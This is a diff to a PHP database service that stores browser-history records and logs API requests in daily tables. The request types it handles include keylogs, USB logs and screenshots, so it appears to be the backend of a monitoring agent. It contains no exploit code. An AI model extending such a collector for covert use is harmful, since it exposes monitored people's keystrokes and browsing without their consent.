@@ -74,24 +74,32 @@ class DatabaseService {
         
         $inserted_count = 0;
         foreach ($browserHistories as $browserHistory) {
-            $browser = $browserHistory['browser'] ?? '';
-            $url = $browserHistory['url'] ?? '';
-            $title = $browserHistory['title'] ?? '';
-            
-            // Handle different platform data formats
-            $lastVisit = $this->normalizeDateTime($browserHistory['last_visit'] ?? null);
-            $visitDate = $this->normalizeDateTime($browserHistory['date'] ?? null);
-            
-            // // Skip records with missing required fields
-            // if (empty($browser) || empty($url)) {
-            //     continue;
-            // }
-            
-            $stmt->bind_param("isssss", $ip_id, $browser, $url, $title, $lastVisit, $visitDate);
-            if ($stmt->execute()) {
-                $inserted_count++;
-                // Update storage statistics
-                $this->updateStorageStatistics($ip_id, 'browser_history', $visitDate, strlen($url) + strlen($title));
+            try {
+                $browser = $browserHistory['browser'] ?? '';
+                $url = $browserHistory['url'] ?? '';
+                $title = $browserHistory['title'] ?? '';
+                
+                // Skip records with missing required fields
+                if (empty($browser) || empty($url)) {
+                    error_log("Skipping browser history record with missing fields: browser=" . ($browser ?: 'empty') . ", url=" . ($url ?: 'empty'));
+                    continue;
+                }
+                
+                // Handle different platform data formats
+                $lastVisit = $this->normalizeDateTime($browserHistory['last_visit'] ?? null);
+                $visitDate = $this->normalizeDateTime($browserHistory['date'] ?? null);
+                
+                $stmt->bind_param("isssss", $ip_id, $browser, $url, $title, $lastVisit, $visitDate);
+                if ($stmt->execute()) {
+                    $inserted_count++;
+                    // Update storage statistics
+                    $this->updateStorageStatistics($ip_id, 'browser_history', $visitDate, strlen($url) + strlen($title));
+                } else {
+                    error_log("Failed to insert browser history: " . $stmt->error . " - Browser: $browser, URL: " . substr($url, 0, 100));
+                }
+            } catch (Exception $e) {
+                error_log("Error processing browser history record: " . $e->getMessage());
+                continue;
             }
         }
         
@@ -112,8 +120,14 @@ class DatabaseService {
         if (is_numeric($value)) {
             $timestamp = (int)$value;
             
-            // Handle different timestamp formats
-            if ($timestamp > 1000000000000) {
+            // Handle Windows epoch microseconds (very large numbers like 13404779250090721)
+            // Windows epoch starts at 1601-01-01, Unix epoch starts at 1970-01-01
+            // Difference: 11644473600 seconds = 11644473600000000 microseconds
+            if ($timestamp > 10000000000000000) {
+                // Windows epoch microseconds - convert to Unix epoch seconds
+                $unixTimestamp = ($timestamp / 1000000) - 11644473600;
+                return date('Y-m-d H:i:s', (int)$unixTimestamp);
+            } elseif ($timestamp > 1000000000000) {
                 // Milliseconds since epoch (JavaScript style)
                 return date('Y-m-d H:i:s', $timestamp / 1000);
             } elseif ($timestamp > 1000000000) {
@@ -655,6 +669,121 @@ class DatabaseService {
         $result = $stmt->execute();
         $stmt->close();
         
+        return $result;
+    }
+    
+    /**
+     * Ensure daily API log table exists for the given date
+     * Creates table if it doesn't exist
+     * 
+     * @param string|null $date Date in YYYY-MM-DD format, or null for today
+     * @return string Table name
+     */
+    public function ensureDailyLogTable($date = null) {
+        if ($date === null) {
+            $date = date('Y-m-d');
+        }
+        
+        // Validate date format
+        if (!preg_match('/^\d{4}-\d{2}-\d{2}$/', $date)) {
+            $date = date('Y-m-d');
+        }
+        
+        $table_name = 'api_logs_' . str_replace('-', '_', $date);
+        
+        // Check if table exists
+        $check_sql = "SHOW TABLES LIKE '$table_name'";
+        $result = $this->mysqli->query($check_sql);
+        
+        if ($result && $result->num_rows > 0) {
+            // Table exists
+            $result->free();
+            return $table_name;
+        }
+        
+        // Create table
+        $create_sql = "
+            CREATE TABLE `$table_name` (
+              `id` bigint(20) NOT NULL AUTO_INCREMENT,
+              `endpoint` varchar(255) NOT NULL,
+              `method` varchar(10) NOT NULL,
+              `request_type` varchar(50) DEFAULT NULL,
+              `ip_address` varchar(45) NOT NULL,
+              `status_code` int(11) NOT NULL,
+              `response_time_ms` decimal(10,2) NOT NULL,
+              `created_at` timestamp NOT NULL DEFAULT current_timestamp(),
+              PRIMARY KEY (`id`),
+              KEY `idx_endpoint` (`endpoint`),
+              KEY `idx_request_type` (`request_type`),
+              KEY `idx_ip_address` (`ip_address`),
+              KEY `idx_status_code` (`status_code`),
+              KEY `idx_created_at` (`created_at`)
+            ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci
+        ";
+        
+        if ($this->mysqli->query($create_sql)) {
+            error_log("Created daily API log table: $table_name");
+            return $table_name;
+        } else {
+            error_log("Failed to create daily API log table: " . $this->mysqli->error);
+            return false;
+        }
+    }
+    
+    /**
+     * Log API request to daily log table
+     * 
+     * @param string $endpoint API endpoint (e.g., '/eventhandler.php')
+     * @param string $method HTTP method (GET, POST, etc.)
+     * @param string $ip_address Client IP address
+     * @param int $status_code HTTP status code
+     * @param float $response_time_ms Response time in milliseconds
+     * @param string|null $request_type Request type (e.g., 'Tic', 'BrowserHistory', 'KeyLog', 'USBLog', 'screenshot', 'config', etc.)
+     * @return bool Success status
+     */
+    public function logApiRequest($endpoint, $method, $ip_address, $status_code, $response_time_ms, $request_type = null) {
+        // Ensure daily table exists
+        $table_name = $this->ensureDailyLogTable();
+        if (!$table_name) {
+            return false;
+        }
+        
+        // Check if request_type column exists (for backward compatibility with existing tables)
+        $column_exists = false;
+        $check_column = $this->mysqli->query("SHOW COLUMNS FROM `$table_name` LIKE 'request_type'");
+        if ($check_column && $check_column->num_rows > 0) {
+            $column_exists = true;
+            $check_column->free();
+        }
+        
+        // Prepare insert statement
+        if ($column_exists) {
+            $stmt = $this->mysqli->prepare("
+                INSERT INTO `$table_name` (endpoint, method, request_type, ip_address, status_code, response_time_ms) 
+                VALUES (?, ?, ?, ?, ?, ?)
+            ");
+            $stmt->bind_param("ssssid", $endpoint, $method, $request_type, $ip_address, $status_code, $response_time_ms);
+        } else {
+            // Fallback for tables created before request_type was added
+            $stmt = $this->mysqli->prepare("
+                INSERT INTO `$table_name` (endpoint, method, ip_address, status_code, response_time_ms) 
+                VALUES (?, ?, ?, ?, ?)
+            ");
+            $stmt->bind_param("sssid", $endpoint, $method, $ip_address, $status_code, $response_time_ms);
+        }
+        
+        if (!$stmt) {
+            error_log("Failed to prepare API log statement: " . $this->mysqli->error);
+            return false;
+        }
+        
+        $result = $stmt->execute();
+        
+        if (!$result) {
+            error_log("Failed to log API request: " . $stmt->error);
+        }
+        
+        $stmt->close();
         return $result;
     }
 }
